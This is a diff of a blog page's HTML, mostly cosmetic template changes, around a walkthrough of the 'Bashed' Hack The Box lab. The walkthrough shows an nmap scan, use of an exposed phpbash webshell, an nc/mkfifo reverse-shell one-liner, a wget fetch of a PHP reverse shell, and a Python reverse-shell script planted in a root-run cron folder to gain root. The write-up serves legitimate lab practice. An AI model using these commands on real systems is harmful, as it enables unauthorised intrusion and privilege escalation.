@@ -14,46 +14,81 @@
 
 
 
-  
-  <meta name="author" content="Neal" />
-  <meta name="description" content="
-Introduction Target: 10.10.10.68 (OS: Linux)
-Kali linux: 10.10.16.44
-Information Enumeration Firstly, detect the open ports:
-# Nmap 7.70 scan initiated Wed Apr 3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.68 Host is up (0.31s latency). Not shown: 39680 closed ports, 25854 filtered ports PORT STATE SERVICE 80/tcp open http Only port 80 is open, it may be an easy box. And the truth is that it is really an easy box.
-" />
+
 
   
+    
   
 
-  
-  <meta property="og:type" content="article" />
-  <meta property="og:title" content="Bashed -- hack the box" />
-  <meta property="og:description" content="
-Introduction Target: 10.10.10.68 (OS: Linux)
-Kali linux: 10.10.16.44
-Information Enumeration Firstly, detect the open ports:
-# Nmap 7.70 scan initiated Wed Apr 3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.68 Host is up (0.31s latency). Not shown: 39680 closed ports, 25854 filtered ports PORT STATE SERVICE 80/tcp open http Only port 80 is open, it may be an easy box. And the truth is that it is really an easy box.
-" />
-  <meta property="og:url" content="https://madneal.com/post/bashed-hack-the-box/" />
-  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
 
 
+<meta name="author" content="Neal" />
+<meta name="description" content=" (https://imgchr.com/i/AgdMvj) Introduction Target: 10.10.10.68 (OS: Linux) Kali linux: 10.10.16.44 Information Enumeration Firstly, detect the open ports: Only …" />
+<meta name="generator" content="Hugo 0.145.0" />
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Bashed -- hack the box" />
+<meta property="og:description" content=" (https://imgchr.com/i/AgdMvj) Introduction Target: 10.10.10.68 (OS: Linux) Kali linux: 10.10.16.44 Information Enumeration Firstly, detect the open ports: Only …" />
+<meta property="og:url" content="https://madneal.com/post/bashed-hack-the-box/" />
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
+<meta property="og:site_name" content="Neal&#39;s Blog" />
+
+<meta property="article:published_time" content="2019-04-04T00:00:00Z" />
+<meta property="article:modified_time" content="2019-04-04T00:00:00Z" />
+<meta property="article:tag" content="安全" />
+<meta property="article:tag" content="渗透测试" />
+<meta property="article:tag" content="HTB" />
+
+
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:site" content="@gohugoio" />
+<meta name="twitter:title" content="Bashed -- hack the box" />
+<meta name="twitter:description" content=" (https://imgchr.com/i/AgdMvj) Introduction Target: 10.10.10.68 (OS: Linux) Kali linux: 10.10.16.44 Information Enumeration Firstly, detect the open ports: Only …" />
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "\"Bashed -- hack the box\"",
+  "description": "\" (https://imgchr.com/i/AgdMvj) Introduction Target: 10.10.10.68 (OS: Linux) Kali linux: 10.10.16.44 Information Enumeration Firstly, detect the open ports: Only …\"",
+  "url": "\"https://madneal.com/post/bashed-hack-the-box/\"",
+  "datePublished": "\"2019-04-04T00:00:00Z\"",
+  "dateModified": "\"2019-04-04T00:00:00Z\"",
+  "author": {
+    "@type": "Person",
+    "name": "\"Neal\""
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "\"Neal's Blog\"",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "\"https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg\""
+    }
+  },
+  "image": "\"https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg\""
+}
+</script>
 
 
 
 <link rel="canonical" href="https://madneal.com/post/bashed-hack-the-box/" />
-<link rel="alternative" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />
+<link rel="alternate" href="https://madneal.com/index.xml" title="Neal&#39;s Blog" type="application/rss+xml" />
 
 
 <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta name="format-detection" content="telephone=no,email=no,address=no" />
 <meta http-equiv="Cache-Control" content="no-transform" />
 
 
-<meta content="" name="keywords">
+
 <meta name="robots" content="index,follow" />
 <meta name="referrer" content="origin-when-cross-origin" />
 <meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />
@@ -81,16 +116,17 @@ Information Enumeration Firstly, detect the open ports:
 
 
 
-<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/css/bundle.css" />
+<style>
+.wechat-qr{width:15rem;height:15rem;margin:0 auto 1.5rem}@media screen and (max-width:800px){.wechat-qr{display:none}}.menu-toggle:focus{color:#5fbf5e}.post-detail .post-toc{margin:0 0 2rem;padding:1rem 1.25rem;border-left:3px solid #5fbf5e;background:#f4f3f1;font-size:.95rem}.post-detail .post-toc h2{margin:0 0 .5rem;font-size:1rem}.post-detail .post-toc ul,.post-detail .post-toc ol{margin:.25rem 0;padding-left:1.25rem}.post-detail .post-toc a{color:#4a4a4a}.post-detail .post-toc a:hover{color:#5fbf5e}.post-detail .post-footer .wechat-card{margin:2rem 0;padding:1rem;border-radius:5px;background:#f4f3f1;text-align:center}.post-detail .post-footer .wechat-card p{margin-top:0}.post-detail .post-footer .wechat-card img{width:12rem;height:12rem}.post-content h1 .heading-anchor,.post-content h2 .heading-anchor,.post-content h3 .heading-anchor,.post-content h4 .heading-anchor,.post-content h5 .heading-anchor,.post-content h6 .heading-anchor{margin-left:.25rem;border-bottom:none;color:#b5b5b5;font-size:.75em;opacity:0;transition:opacity .5s ease-out,color .5s ease-out}.post-content h1:hover .heading-anchor,.post-content h2:hover .heading-anchor,.post-content h3:hover .heading-anchor,.post-content h4:hover .heading-anchor,.post-content h5:hover .heading-anchor,.post-content h6:hover .heading-anchor,.post-content .heading-anchor:focus{opacity:1}.post-content .heading-anchor:hover,.post-content .heading-anchor:focus{color:#5fbf5e;border-bottom:none}.post-content pre{position:relative}.post-content pre .code-copy{position:absolute;top:.5rem;right:.5rem;padding:.2rem .45rem;border:1px solid #dbdbdb;border-radius:2px;background:#fafafa;color:#797979;font-size:.8rem;cursor:pointer;opacity:0;transition:opacity .5s ease-out,color .5s ease-out}.post-content pre:hover .code-copy,.post-content pre .code-copy:focus{opacity:1}.post-content pre .code-copy:hover,.post-content pre .code-copy:focus{color:#5fbf5e}.post-content table{display:block;overflow-x:auto}
+</style>
 
 
   
   <!--[if lt IE 9]>
     <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
     <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
-    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
   <![endif]-->
 
 <!--[if lte IE 11]>
@@ -118,15 +154,15 @@ Information Enumeration Firstly, detect the open ports:
     
     
   <header class="site-header">
-  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar">
+  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar" width="128" height="128" decoding="async">
   
   <h2 class="title">Neal&#39;s Blog</h2>
   
   <p class="subtitle">Development &amp; Security</p>
-  <button class="menu-toggle" type="button">
+  <button class="menu-toggle" type="button" aria-controls="site-menu social-menu" aria-expanded="false" aria-label="Toggle navigation">
     <span class="icon icon-menu"></span>
   </button>
-  <nav class="site-menu collapsed">
+  <nav id="site-menu" class="site-menu collapsed">
     <h2 class="offscreen">Main Menu</h2>
     <ul class="menu-list">
       
@@ -158,8 +194,8 @@ Information Enumeration Firstly, detect the open ports:
       
     </ul>
   </nav>
-  <img src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" style="width: 240px;height: 240px;">
-  <nav class="social-menu collapsed">
+  <img class="wechat-qr" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" width="240" height="240" loading="lazy" decoding="async">
+  <nav id="social-menu" class="social-menu collapsed">
     <h2 class="offscreen">Social Networks</h2>
     <ul class="social-list">
 
@@ -224,13 +260,31 @@ Information Enumeration Firstly, detect the open ports:
   <section class="main post-detail">
     <header class="post-header">
       <h1 class="post-title">Bashed -- hack the box</h1>
-      <p class="post-meta">@Neal · Apr 4, 2019 · 3 min read</p>
+      <p class="post-meta">@Neal · <time datetime="2019-04-04">2019-04-04</time> · 约 3 分钟阅读</p>
     </header>
-    <article class="post-content"><p><a href="https://imgchr.com/i/AgdMvj"><img src="https://s2.ax1x.com/2019/04/03/AgdMvj.md.png" alt="AgdMvj.md.png"></a></p>
-<h2 id="introduction">Introduction</h2>
+    
+      <nav class="post-toc" aria-label="文章目录">
+        <h2>目录</h2>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#information-enumeration">Information Enumeration</a></li>
+    <li><a href="#exploit">Exploit</a>
+      <ul>
+        <li><a href="#http">Http</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav>
+      </nav>
+    
+    <article class="post-content"><p><a href="https://imgchr.com/i/AgdMvj"><img src="https://s2.ax1x.com/2019/04/03/AgdMvj.md.png" alt="AgdMvj.md.png" loading="lazy" decoding="async">
+</a></p>
+<h2 id="introduction">Introduction <a class="heading-anchor" href="#introduction" aria-label="链接到本节">#</a></h2>
 <p>Target: 10.10.10.68 (OS: Linux)</p>
 <p>Kali linux: 10.10.16.44</p>
-<h2 id="information-enumeration">Information Enumeration</h2>
+<h2 id="information-enumeration">Information Enumeration <a class="heading-anchor" href="#information-enumeration" aria-label="链接到本节">#</a></h2>
 <p>Firstly, detect the open ports:</p>
 <pre tabindex="0"><code># Nmap 7.70 scan initiated Wed Apr  3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68
 Warning: 10.10.10.68 giving up on port because retransmission cap hit (10).
@@ -250,28 +304,35 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Arrexel&#39;s Development Site
 </code></pre><p>Nothing special. Then access the http service and find more.</p>
-<h2 id="exploit">Exploit</h2>
-<h3 id="http">Http</h3>
+<h2 id="exploit">Exploit <a class="heading-anchor" href="#exploit" aria-label="链接到本节">#</a></h2>
+<h3 id="http">Http <a class="heading-anchor" href="#http" aria-label="链接到本节">#</a></h3>
 <p>Access to <code>http://10.10.10.68</code>, and it seems to be a simple blog which talks about <code>phpbash</code>.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AgfJCd.png" alt="AgfJCd.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/04/AgfJCd.png" alt="AgfJCd.png" loading="lazy" decoding="async">
+</p>
 <p><code>phpbash</code> seems to be a webshell tool. And there is a github repository <a href="https://github.com/Arrexel/phpbash">phpbash</a> introduces the tool. The introduction of the repo is to drop the file to target and access it by <code>http://ip/uploads/phpbash.php</code>. Try to access <code>http://10.10.10.68/uploads/phpbash.php</code>. But the file seems not to be here.</p>
 <p>Utilize the dirbuster to enumerate the directories.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AgfTPJ.png" alt="AgfTPJ.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/04/AgfTPJ.png" alt="AgfTPJ.png" loading="lazy" decoding="async">
+</p>
 <p>Wow. Find it and open the file <code>phpbash.php</code>. Here is the webshell. I have tried to reverse shell by <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f</code>. But the shell cannot be returned. Whatever, I can obtain the user.txt.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AghFMt.png" alt="AghFMt.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/04/AghFMt.png" alt="AghFMt.png" loading="lazy" decoding="async">
+</p>
 <p>It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found <a href="https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php">here</a>. And I server the php script by <code>python -m SimpleHTTPServer 80</code>. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: <code>/tmp</code>.</p>
-<p><a href="https://imgchr.com/i/AghBsx"><img src="https://s2.ax1x.com/2019/04/04/AghBsx.png" alt="AghBsx.png"></a></p>
+<p><a href="https://imgchr.com/i/AghBsx"><img src="https://s2.ax1x.com/2019/04/04/AghBsx.png" alt="AghBsx.png" loading="lazy" decoding="async">
+</a></p>
 <p><code>wget http://10.10.16.44/php-reverse-shell.php</code></p>
 <p>Then in the kali, set the <code>nc</code> listen to port 1234:</p>
 <p><code>nc -lvnp 1234</code></p>
 <p>Execute the php script in the target machine <code>php php-reverse-shell.php</code>. OK. We obtain the reverse shell.</p>
-<p><a href="https://imgchr.com/i/AghhQI"><img src="https://s2.ax1x.com/2019/04/04/AghhQI.png" alt="AghhQI.png"></a></p>
-<h2 id="privilege-escalation">Privilege escalation</h2>
+<p><a href="https://imgchr.com/i/AghhQI"><img src="https://s2.ax1x.com/2019/04/04/AghhQI.png" alt="AghhQI.png" loading="lazy" decoding="async">
+</a></p>
+<h2 id="privilege-escalation">Privilege escalation <a class="heading-anchor" href="#privilege-escalation" aria-label="链接到本节">#</a></h2>
 <p>Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize <code>sudo -l</code> to see the permissions of the user. Something interesting found. We can switch to <code>scriptmanager</code> user without password.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/Ag4cn0.png" alt="Ag4cn0.png"></p>
+<p><img src="https://s2.ax1x.com/2019/04/04/Ag4cn0.png" alt="Ag4cn0.png" loading="lazy" decoding="async">
+</p>
 <pre tabindex="0"><code>su -u scrriptmanager bash -i
 </code></pre><p>Try to enumerate the files. And I find an interesting folder inside <code>/scripts</code>. There are two files <code>test.py</code> and <code>test.txt</code>. Try to display the content of <code>test.py</code>.</p>
-<p><a href="https://imgchr.com/i/AghxO0"><img src="https://s2.ax1x.com/2019/04/04/AghxO0.png" alt="AghxO0.png"></a></p>
+<p><a href="https://imgchr.com/i/AghxO0"><img src="https://s2.ax1x.com/2019/04/04/AghxO0.png" alt="AghxO0.png" loading="lazy" decoding="async">
+</a></p>
 <p>The python script is quite straightforward. It just writes <code>testing 123!</code> to the file <code>test.txt</code>. And if we see the attributes of <code>test.txt</code>, the modified time of the file changes each minute. And the file is owned by root. It seems that <code>root</code> will execute the python scripts in <code>/scripts</code> folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;
 </span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);
@@ -281,27 +342,29 @@ PORT   STATE SERVICE VERSION
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);
 </span></span></code></pre></div><p>Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/AgICRJ.png" alt="AgICRJ.png"></p>
-<p><a href="https://imgchr.com/i/AgIks1"><img src="https://s2.ax1x.com/2019/04/04/AgIks1.png" alt="AgIks1.png"></a></p>
+<p><img src="https://s2.ax1x.com/2019/04/04/AgICRJ.png" alt="AgICRJ.png" loading="lazy" decoding="async">
+</p>
+<p><a href="https://imgchr.com/i/AgIks1"><img src="https://s2.ax1x.com/2019/04/04/AgIks1.png" alt="AgIks1.png" loading="lazy" decoding="async">
+</a></p>
 </article>
     <footer class="post-footer">
+      <div class="wechat-card">
         <p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p>
-        <img src="https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg" alt="mad_coder">
+        <img src="https://user-images.githubusercontent.com/12164075/133170982-62816554-7dd8-4e97-adbc-734f1df61e73.jpg" alt="mad_coder" loading="lazy" decoding="async">
+      </div>
       
       <ul class="post-tags">
         
-          <li><a href="https://madneal.com/tags/%E5%AE%89%E5%85%A8"><span class="tag">安全</span></a></li>
+          <li><a href="https://madneal.com/tags/%E5%AE%89%E5%85%A8/"><span class="tag">安全</span></a></li>
         
-          <li><a href="https://madneal.com/tags/hack-the-box"><span class="tag">Hack the Box</span></a></li>
+          <li><a href="https://madneal.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span></a></li>
         
-          <li><a href="https://madneal.com/tags/walkthrough"><span class="tag">Walkthrough</span></a></li>
-        
-          <li><a href="https://madneal.com/tags/linux"><span class="tag">Linux</span></a></li>
+          <li><a href="https://madneal.com/tags/htb/"><span class="tag">HTB</span></a></li>
         
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2633</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2634</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
@@ -316,29 +379,8 @@ PORT   STATE SERVICE VERSION
 
 
 
-<script async src="//cdn.bootcss.com/video.js/6.2.8/alt/video.novtt.min.js"></script>
-<script async src="//cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [['$','$'], ['\\(','\\)']],
-      displayMath: [['$$','$$'], ['\\[','\\]']],
-      processEscapes: true,
-      processEnvironments: true,
-      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
-      TeX: { equationNumbers: { autoNumber: "AMS" },
-      extensions: ["AMSmath.js", "AMSsymbols.js"] }
-    }
-  });
-</script>
-<script type="text/x-mathjax-config">
-  // Fix <code> tags after MathJax finishes running. This is a
-  // hack to overcome a shortcoming of Markdown. Discussion at
-  // https://github.com/mojombo/jekyll/issues/199
-  MathJax.Hub.Queue(() => {
-    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
-  });
-</script>
+
+
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
   
